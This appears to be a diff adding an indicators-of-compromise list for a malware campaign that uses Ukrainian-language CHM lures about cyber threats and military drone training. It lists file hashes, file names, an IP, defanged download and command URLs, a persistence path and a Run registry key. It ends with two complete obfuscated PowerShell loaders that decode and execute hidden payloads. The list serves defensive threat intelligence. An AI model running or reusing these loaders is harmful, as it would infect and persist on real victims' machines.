@@ -1,0 +1,43 @@
+9d2f8a6f5d517a7bfce2965702de80d1
+5f0011ab360048a3506bfc09d57d49c0
+5f4a7fdbbf3db222342708a036b86fd0
+c7c1b13e245b04a1b852b38c4e3113b7
+101acc2b4f0979b49113a5967cf333c8
+288440a52827e4a495187e4a4e66fbd1
+a9579193b492363a92875f66078a7840
+5285a5665a48590d8cfca713d5aeb927
+439d0683100c5fa15eb176e014dad713
+640dad82507c9400e4b704841b941d29
+598af59ff921adf83e592ab750dc421095777f167bd8b743049b2b7e89e9df78
+5c02b94a6907c8b03947319e5cafffab6e36d0c5cd041cc81b124912f22c5023
+46fa63af33fb7a42d3f79ed81d38e5cadda7d311b07b2306e917179948189c7a
+ea7352450cbf79590044a2aca7b81e61305e4a0a1bef6875bd09bf5b6e111d20
+4659d371c9b6db1687d6dd027e95563da88a29378de4f87db19b267859d04d03
+33557c31841401f85485638973505327a8ae9a207fbb664cd0777322eea75c4d
+415a0d476aef25a84ac833d4276196bc83276bbb465ffc0880bcbe106b1c4ab3
+5a8a72d262e4a92259aa6ecb54b13898d57f76af9f2a048c640d53c2cd29ad19
+e556d7cae4f9c5800b78c891be642f75fcf5c931af9c2efb626750542c8086b1
+ebedaeb0e646f18194f2bc994866fbe84289e170190e7ff80bec22df85d4ac3b
+ВНУТРІШНІ КІБЕРЗАГРОЗИ.chm 
+New_Item1.htm
+ctlhost.exe
+ctlhost.exe.tmp
+ctlhost.exe
+ctlhost.decrypted_golang.exe
+Інфо про навчання по БПЛА для військових.chm
+page1.html
+ublkdc.bin
+ctlhost.exe
+45.153.215.48
+cert-ua@ukr.net
+hXXps://files.catbox.moe/g1h7zr.bin
+hXXps://files.catbox.moe/ublkdc.bin
+hXXps://listen.servemp3.com:443
+hXXps://shorturl.at/iopr9
+listen.servemp3.com
+%LOCALAPPDATA%\SysctlHost\ctlhost.exe
+%LOCALAPPDATA%\SysctlHost\ctlhost.exe.tmp
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ctlhost
+cmd.exe /c start /min %windir%\system32\WindowsPowerShell\v1.0\powershell.exe -command Start-Process -filepath "%LOCALAPPDATA%\SysctlHost\ctlhost.exe" -WindowStyle Hidden
+cmd.exe /c start /min powershell -windowstyle hidden -executionPolicy bypass -command $es = 'H4sIAAAAAAAEAK1WC2/iRhD+KxthajtgB0h7lwRVagohSZULUcwpUhFBxh7w9ozXXS8PH+W/dwZs4iQXElWVEN6d5+f5ZtarxeFXGbJfmR4oFSdnR0dJIKSaydB21dF19+7+VG9qcXjnqsCZjcd8SbZOmngqvBKJOsJngE8bloCGnkxjdeeQzfJ43nlolGSPH/x00Ti+j75fjnj521/Hp5eVw9Oad5JeBeixFPKLm3xz+Hcgr5P6yedNwnM5SVCgRbMwpP0V932ISKLkDJrjWeQpLiLmC4etNIjm53HcdpWLFn2Ep2BqX0RzLkU0hUgNzs4uQXVE6IOkVzH0G+G5IfqE3HMpEPnqJmbCAMYfgkcW2bFi5GdlMJt8bOSZrrt2h4eAWS6WPFGJocWmuZKAdYyYVW+uNb+AC60pzhZTm0vwlJDprTsF8qO4BwXTnUEhum+abHULC+sajdjmv5fGwHa2bIueLP9h3ZmybqmM64+GzpE3EHkSF6D3YKmwrp7weTRBr6+9zomNb+EoiQKjP0oV9AeD34zasvHZpHImG1qH/QMnLSVDBdWpfQslZT/AcDhqlUP++AjRkAiKoLQwTLtdFotSNAyFe+h3hlhVPY9CD/se4tD1wNBLelXXzR/rHvfoDvboqnt0wz268h7dYUFXwd7SDZ1VGJW1Qh1F05dt9SorqnZL9MYfh6VBQV41yJ7OO26uc0pYPmnEZiajmi+M4giaTV+stMBNApAF2h3wZpKr1G7RfIuJdOMgtZ2r88Yvn7YiB+Sce3AnxZzjjGWhzeZT+iSg2cxi2y0xjWcKaGe811y/Ywh8sexswa7qc5xopgmMV2uOhTQyAd8I6GmFavfC9g1EExWQvFLB5s7lfY0PCBEC62tiQGWtVDCoBX9vhJkfebyNnVRI7hbKer1miwDpMLSxGxJVL2jCMQF3ikjH9efnQUGZkRJXX+q/CJ947sYQVdlL5bnnQZKg+h5cf0/exrt5qeFsNY31fQC6soVOOM1vA3nAhsEKaKNXDfdz7fTTrmbUb9Kj6o7rNoE3tFGV1apMG+UE7KFYehmtK22U87ldWCOkmT1xjQRvMjLDwGeF1U1WftkiJh5344a9Qb6DIT0U57QiUmuiWA3hI9xWKBIwaN0orN+n9kMlfpfjj5D5P3Hoe88z0QRINMHvpn35J4+fZx3Xq28ZF9YZkjZ4mWyTBy3itCcwSCPbP9X1h/V+fRC2IQTi76nMdGTitzC7VFhu5LNskxGfkbrKzLZ3DXOVKFcqZj3wyBcLR6UhsOwaYlGu7QUhZhZGmtEt4wZP4Dwy9gzgEcDyIB9wyD3+E4o9+TBy9kHAIwrvS81/AUykKbP1CQAA';function isV {param ($v)if(!$v -or !$v.Length) {return $false;}return $true;}function gzu {param ($ca)if (!(isV($ca))) {return $null;}$msIn  = [System.IO.MemoryStream]::new($ca);$msOut = [System.IO.MemoryStream]::new();$dc = [System.IO.Compression.GZipStream]::new($msIn, [System.IO.Compression.CompressionMode]::Decompress);$dc.CopyTo($msOut);$dc.Close();$msIn.Close();$msOut.Close();$res = $msOut.ToArray();return $res;}function doIn {if (!(isV($es))) {return -201;}$r2 = [System.Convert]::FromBase64String($es);$es = $null;if (!(isV($r2))) {return -202;}$r3 = gzu($r2);$r2 = $null;if (!(isV($r3))) {return -203;}$r4 = [System.Text.Encoding]::UTF8.GetString($r3);$r3 = $null;if (!(isV($r4))) {return -204;}.([char](110 - 5) + [char](98 + 3) + [char](254 - 134))($r4);$r4 = $null;return 0;}try { doIn;} catch {}
+cmd.exe /c start /min powershell -windowstyle hidden -executionPolicy bypass -command $es = 'I5tJBBBBBBBFBL2XE30jOiU0Lr6Jm,RhLcEsYWd17UppcV,:usw1iESFVVifjuVR6yxIzCkggf:CRmQvTqF3DXI80g460[5eb4I5UZcte7bQmZrU17PkhJfR3K7sSnKvUxRdqbQxzggtFZ01mibIe75bP3lR9Em6PWojrgCTKPpJy{HPOtxCEU3[yfsPJSu4gOg:90hUo0Kg{q2k03KzVY4gr3fgf3h3G0LMn{x60H9h16QHzdeWmkQ6nLCBj:JxqQVm:43JTLKlDr1hkU{GSdS95cDGCuI1MJ58soMSpp,ZGF{t93kLqZhnFLoC7flGrL5Jg[DF4:DwiffH7COz4DlHJm0eyFxZxQhtfHTSITuIgsG4t9VEp9i1eXu4tXrZ6Y{PF6VZXnzbDxlrmSH{Hr3m6qexpUYGXXQrdBnfFkL8dTeBgiU4pHT7NTiG:13UMX6h[m3iFWw:43dytJ1uX7Noz40ZcbrtHzskdu0RCgJnJl0jFwS8nDvtrze9Ik3j28g88pnOv4DVSJISI3VL,pQCK7N,c451r[{Kju[i09EKLtmRRX2j41CG3U1ZElgux6B0QFB1KJJjrNxN1,5djmlmHpcDgfe4i2iWwZiDh01W5uE2xOBsfl4Y{[0sIocpEocpbku1xy37xy37ezWeGYuMO4SX[WUXLoVVIc69reeZXcX[pkg,srLqfBMsgC6MTCKrgRr64T183wEY2sMhiyYIkrkO[VUB{DjgS8Qmj5V3eqNyzGJQPPDmlrwNcuNKG50Tkdf[8WzfOZ90sFVPzDo45F7LLddEm5d3X90ql{Fe2Ez34SbUPGWBL,PuUwtER,EH9utGX7{Q9Yh{UXD9fjtR1thGgDXh1RsW[tQ3OVTQbl{zbiV8w[E4OU5hSBjts5lCmcWbybBXgG9Kd{0zfC18r[EqO[UmdtmnZ7UE1BJ4UMDbX{UinRG4hljEytwMpbUNTZms30pwxjffc3PJbnycff[63DLp0hrvwzOw99392I33ntU7MhD4tp2PfMSgC:MEitFLbLNgHv6:0cdQn6qSw1nQrit1cBKwbLNbr:fZOjpJ3FHy:IKbG:rp5IN:tV[JN4wnHhmf[XTHhXPWOVy3vO1jKu6:ReOfJe0BlC7LD2pSrgXpXC4iJ:y3LCJxbO5t{e,ner9Tw9oyQnU,Uy{74tuNeBMzL9n,,JwIM8NHkeqsyrW6krREYj6c6VHMPMtYHLT[s60s,uO704hSejBF5v,6{QTCyR:k0tLx4Nio,TJoQje2l[vuIy8nxmHvWCcfbWRP[wW56Jv[p8JRXQ53tTko,uVRNxtkqwU1vNbcvNjBwRO5GcEuZIt5Gq80DeVf,UGU0tIBLxxgW720BY{Hq{FiDhBB';function isV {param ($v)if(!$v -or !$v.Length) {return $false;}return $true;}function gzu {param ($ca)if (!(isV($ca))) {return $null;}$msIn  = [System.IO.MemoryStream]::new($ca);$msOut = [System.IO.MemoryStream]::new();$dc = [System.IO.Compression.GZipStream]::new($msIn, [System.IO.Compression.CompressionMode]::Decompress);$dc.CopyTo($msOut);$dc.Close();$msIn.Close();$msOut.Close();$res = $msOut.ToArray();return $res;}function doInv {if (!(isV($es))) {return -201;}$bb = [System.Text.Encoding]::UTF8.GetBytes($es);for([int]$i = 0; $i -lt $bb.Length; $i++){$bb[$i] = $bb[$i] - 1;}$es = [System.Text.Encoding]::UTF8.GetString($bb);$r2 = [System.Convert]::FromBase64String($es);$es = $null;if (!(isV($r2))) {return -202;}$r3 = gzu($r2);$r2 = $null;if (!(isV($r3))) {return -203;}$r4 = [System.Text.Encoding]::UTF8.GetString($r3);$r3 = $null;if (!(isV($r4))) {return -204;}Invoke-Expression $r4;$r4 = $null;return 0;}try { doInv;} catch {}
